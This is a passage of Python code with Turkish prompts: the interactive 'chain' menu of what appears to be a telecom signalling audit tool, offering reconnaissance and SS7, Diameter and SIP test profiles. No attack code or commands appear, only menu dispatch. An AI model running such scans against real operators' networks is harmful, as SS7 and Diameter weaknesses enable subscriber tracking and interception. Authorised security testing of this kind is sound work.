    print("  1) Hizli Kesif (Sadece tarama + dogrulama)")
    print("  2) Diameter Odakli Denetim")
    print("  3) SIP Odakli Denetim")
    print("  4) SS7 Derin Analiz")
    print("  5) Profilleri Goster")
    print()
    print("  Geri donmek icin 'back' yazin")
    print()

    choice = input("\033[37m(\033[0m\033[2;31mchain\033[0m\033[37m)>\033[0m ").strip().lower()

    if choice == "0":
        run_chain()
        chain_menu()
    elif choice == "1":
        run_chain('quick_recon')
        chain_menu()
    elif choice == "2":
        run_chain('diameter_only')
        chain_menu()
    elif choice == "3":
        run_chain('sip_only')
        chain_menu()
    elif choice == "4":
        run_chain('ss7_deep')
        chain_menu()
    elif choice == "5":
        print("\nMevcut Profiller:")
        for key, prof in DEFAULT_PROFILES.items():
            print(f"  {key:20s}: {prof['name']} - {prof['description']}")

        # Check saved profiles
        profiles_dir = os.path.join(os.path.dirname(__file__), 'profiles')
        if os.path.exists(profiles_dir):
            for f in os.listdir(profiles_dir):
                if f.endswith('.json'):
                    print(f"  {f[:-5]:20s}: (kayitli profil)")

        input("\nDevam etmek icin Enter'a basin...")
        chain_menu()
    elif choice == "back" or choice == "geri":
        return
    else:
        print('\n\033[31m[-]Hata:\033[0m Gecerli bir secim yapin (0-5)')
        time.sleep(1.5)
        chain_menu()


def main():
    chain_menu()


if __name__ == "__main__":
    main()
